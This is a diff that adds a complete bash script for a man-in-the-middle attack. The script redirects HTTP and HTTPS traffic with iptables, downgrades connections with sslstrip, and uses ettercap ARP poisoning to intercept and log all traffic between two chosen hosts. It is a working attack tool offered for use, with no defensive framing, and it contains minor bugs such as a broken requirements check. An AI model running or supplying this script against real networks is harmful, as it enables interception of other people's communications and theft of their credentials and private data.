@@ -1,0 +1,67 @@
+#!/bin/bash
+# Script to perform MITM (Man In The Middle) attacks using ARP poisoning to intercept all messages going between two targets.
+# @depends iptables; ettercap; sslstrip
+# @author Lucas Teixeira Rocha <lucas.redeaberta.com.br>; Alexandro de Deus Costa <comerciogenial@gmail.com>
+# @born 2014-10-19
+
+if [ "$(id -u)" != "0" ]; then
+   echo "This script must be run as root." 1>&2
+   exit 1
+else
+	hasMinimalRequirements=1
+	# Looking for SSLStrip.
+	sslstrip -h &> /dev/null
+	has=$?
+	if [ $has != "0" ]; then
+		echo "SSLStrip was not found. Please install SSLStrip before proceed."
+		hasMinimalRequirements=0
+	fi
+	# Looking for iptables.
+	iptables --version &> /dev/null
+	has=$?
+	if [ $has != "0" ]; then
+		echo "Iptables was not found. Please install iptables before proceed."
+		hasMinimalRequirements=0
+	fi
+	# Looking for Ettercap.
+	ettercap -v &> /dev/null
+	has=$?
+	if [ $has != "0" ]; then
+		echo "Ettercap was not found. Please install Ettercap before proceed."
+		hasMinimalRequirements=0
+	fi
+	if [ hasMinimalRequirements == 0 ]; then
+		exit 1
+	else
+		echo "Choose a network interface: "; read networkInterface
+		echo "Insert target 1: "; read target1
+		echo "Insert target 2: "; read target2
+		echo "Enable remote_browser plugin? (y/n) "; read useRemoteBrowser
+		clear
+		echo "Monitoring traffic between $target1 and $target1 using interface: $networkInterface."
+		# Checking firewall HTTP(S) redirect rule.
+		iptables -L -t nat | grep "dpt:http redir ports 8080" &> /dev/null
+		hasHttpRedirect=$?
+		if [ $hasHttpRedirect != "0" ]; then
+			iptables -t nat -A PREROUTING -i $networkInterface -p tcp --dport 80 -j REDIRECT --to-port 8080
+		fi
+		iptables -L -t nat | grep "dpt:https redir ports 8080" &> /dev/null
+		hasHttpRedirect=$?
+		if [ $hasHttpRedirect != "0" ]; then
+			iptables -t nat -A PREROUTING -i $networkInterface -p tcp --dport 443 -j REDIRECT --to-port 8080
+		fi
+		sslstripLogFile="sslstrip_$(date +%Y%m%d_%H%M%S).log"
+		sslstrip -a -k -l 8080 -w $sslstripLogFile &> /dev/null &
+		ettercapLogFile="ettercap_capture_$(date +%Y%m%d_%H%M%S).pcap"
+		if [[ $useRemoteBrowser == "y" || $useRemoteBrowser == "Y" ]]; then
+			ettercap -p -i $networkInterface -P remote_browser -T -q -M arp:remote /$target1// /$target2// -w $ettercapLogFile
+		else
+			ettercap -p -i $networkInterface -T -q -M arp:remote /$target1// /$target2// -w $ettercapLogFile
+		fi
+		echo ""
+		echo "Ettercap Stopped. Stopping SSLStrip."
+		killall sslstrip
+		echo "Logs and capture files were created at current directory."
+		exit 0
+	fi
+fi
